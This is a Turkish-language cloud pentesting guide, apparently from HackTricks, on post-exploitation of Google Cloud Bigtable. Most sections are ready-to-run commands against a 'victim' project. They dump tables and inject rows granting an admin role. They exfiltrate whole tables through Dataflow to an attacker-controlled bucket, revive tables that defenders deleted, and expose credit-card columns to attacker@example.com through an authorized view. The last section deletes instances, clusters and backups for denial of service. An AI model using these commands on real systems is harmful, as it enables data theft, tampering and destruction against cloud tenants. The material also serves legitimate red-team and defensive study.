# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Bigtable hakkında daha fazla bilgi için bakınız:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> Aşağıdaki komutların yerel olarak çalışması için `cbt` CLI'yi Cloud SDK üzerinden bir kez kurun:
>
> ```bash
> gcloud components install cbt
> ```

### Satırları Oku

**İzinler:** `bigtable.tables.readRows`

`cbt` Cloud SDK ile birlikte gelir ve herhangi bir ara katmana ihtiyaç olmadan admin/data API'leriyle iletişim kurar. Bunu ele geçirilmiş project/instance'a yönlendirip tablodan satırları doğrudan dökebilirsiniz. Sadece göz atmanız gerekiyorsa taramayı sınırlandırın.
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
### Satır yazma

**İzinler:** `bigtable.tables.mutateRows`, (değişikliği doğrulamak için `bigtable.tables.readRows` gerekir).

Aynı aracı kullanarak rastgele hücrelere upsert yapın. Bu, konfigürasyonları backdoor etmek, web shells bırakmak veya poisoned dataset rows eklemek için en hızlı yoldur.
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
`cbt set` ham baytları `@/path` sözdizimiyle kabul eder, böylece derlenmiş payloads veya serileştirilmiş protobufs'ları downstream servislerin beklediği şekilde gönderebilirsiniz.

### Dump rows to your bucket

**İzinler:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Bir Dataflow job'u başlatarak ve satırları sizin kontrolünüzdeki bir GCS bucket'ına akıtarak, bir tablonun tüm içeriğini saldırganın kontrolündeki bir bucket'a exfiltrate etmek mümkündür.

> [!NOTE]
> Bu export işlemini gerçekleştirmek için yeterli izinlere sahip bir SA üzerinde `iam.serviceAccounts.actAs` iznine ihtiyacınız olacağını unutmayın (varsayılan olarak, aksi belirtilmemişse, varsayılan compute SA kullanılacaktır).
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
> [!NOTE]
> Parquet/SequenceFile çıktıları JSON yerine istiyorsanız şablonu `Cloud_Bigtable_to_GCS_Parquet` veya `Cloud_Bigtable_to_GCS_SequenceFile` olarak değiştirin. İzinler aynı; yalnızca şablon yolu değişir.

### Satırları içe aktarma

**İzinler:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Saldırganın kontrolündeki bir bucket'tan, satırları sizin kontrolünüzdeki bir GCS bucket'ına akıtan bir Dataflow job'u başlatarak bir tablonun tamamının içeriğini içe aktarmak mümkündür. Bunun için saldırganın önce beklenen şemayla içe aktarılacak verileri içeren bir parquet dosyası oluşturması gerekir. Saldırgan, önceki teknikte `Cloud_Bigtable_to_GCS_Parquet` ayarını kullanarak verileri parquet formatında dışa aktarabilir ve indirilen parquet dosyasına yeni girdiler ekleyebilir



> [!NOTE]
> Dışa aktarmayı gerçekleştirebilmek için yeterli izinlere sahip bir SA üzerinde `iam.serviceAccounts.actAs` iznine ihtiyaç duyacağınızı unutmayın (varsayılan olarak, aksi belirtilmedikçe, varsayılan compute SA kullanılacaktır).
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
### Yedekleri Geri Yükleme

**İzinler:** `bigtable.backups.restore`, `bigtable.tables.create`.

Bir saldırgan bu izinlere sahip olduğunda, eski hassas verileri kurtarabilmek için kontrolü altındaki yeni bir tabloya bir yedeği geri yükleyebilir.
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
### Tabloları Geri Yükleme

**İzinler:** `bigtable.tables.undelete`

Bigtable, genellikle varsayılan olarak 7 gün olan bir bekleme süresiyle soft-deletion (yumuşak silme) desteği sağlar. Bu süre içinde, `bigtable.tables.undelete` iznine sahip bir saldırgan, yakın zamanda silinmiş bir tabloyu geri yükleyebilir ve tüm verilerini kurtararak yok edildiği düşünülen hassas bilgilere erişebilir.

Bu özellikle şunlar için kullanışlıdır:
- Olay müdahalesi sırasında savunma ekipleri tarafından silinen tablolardan veri kurtarmak
- Kasıtlı olarak temizlenmiş geçmiş verilere erişmek
- Kalıcılığı sürdürmek için kazara veya kötü amaçlı silmeleri geri almak
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
> [!NOTE]
> undelete işlemi yalnızca yapılandırılmış saklama süresi içinde çalışır (varsayılan 7 gün). Bu süre dolduktan sonra tablo ve verileri kalıcı olarak silinir ve bu yöntemle kurtarılamaz.


### Yetkilendirilmiş Görünümler Oluşturma

**İzinler:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Yetkilendirilmiş görünümler, tablonun seçilmiş bir alt kümesini sunmanızı sağlar. En az ayrıcalık ilkesini uygulamak yerine, ilgilendiğiniz **tam olarak hassas sütun/satır kümelerini** yayınlamak ve kendi principal'inizi izin verilenler listesine almak için bunları kullanın.

> [!WARNING]
> Sorun şu ki, bir yetkilendirilmiş görünüm oluşturmak için temel tablodaki satırları okuyup değiştirebilme yeteneğine de sahip olmanız gerekir; dolayısıyla ekstra bir izin elde etmiyorsunuz ve bu teknik büyük ölçüde kullanışsızdır.
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
Erişim görünüm bazında sınırlandırıldığı için, savunucular genellikle sizin yeni bir yüksek hassasiyetli uç nokta oluşturduğunuzu fark etmezler.

### Yetkilendirilmiş Görünümleri Okuma

**Permissions:** `bigtable.authorizedViews.readRows`

Yetkilendirilmiş bir Görünüme erişiminiz varsa, okuma isteklerinizde görünüm adını belirterek Bigtable istemci kütüphanelerini kullanarak verilerini okuyabilirsiniz. Yetkilendirilmiş görünümün tablodan erişebileceğiniz verileri muhtemelen sınırlayacağını unutmayın. Aşağıda Python kullanarak bir örnek bulunmaktadır:
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
### Denial of Service ile Silme İşlemleri

**İzinler:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Bigtable üzerindeki herhangi bir silme izni, Denial of Service saldırıları için kullanılabilir. Bu izinlere sahip bir saldırgan, kritik Bigtable kaynaklarını silerek operasyonları aksatabilir:

- **`bigtable.appProfiles.delete`**: Uygulama profillerini siler, istemci bağlantılarını ve yönlendirme yapılandırmalarını bozar
- **`bigtable.authorizedViews.delete`**: Yetkilendirilmiş görünümleri kaldırır, uygulamalar için meşru erişim yollarını keser
- **`bigtable.authorizedViews.deleteTagBinding`**: Yetkilendirilmiş görünümlerden etiket bağlarını kaldırır
- **`bigtable.backups.delete`**: Yedek anlık görüntüleri yok eder, felaket kurtarma seçeneklerini ortadan kaldırır
- **`bigtable.clusters.delete`**: Tüm kümeleri siler, anında veri kullanılamazlığına yol açar
- **`bigtable.instances.delete`**: Tüm Bigtable örneklerini kaldırır, tüm tabloları ve yapılandırmaları siler
- **`bigtable.tables.delete`**: Bireysel tabloları siler, veri kaybına ve uygulama hatalarına yol açar
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
> [!WARNING]
> Silme işlemleri genellikle anlık ve geri döndürülemezdir. Bu komutları test etmeden önce yedeklerin mevcut olduğundan emin olun; çünkü kalıcı veri kaybına ve ciddi hizmet aksamasına yol açabilirler.

{{#include ../../../banners/hacktricks-training.md}}
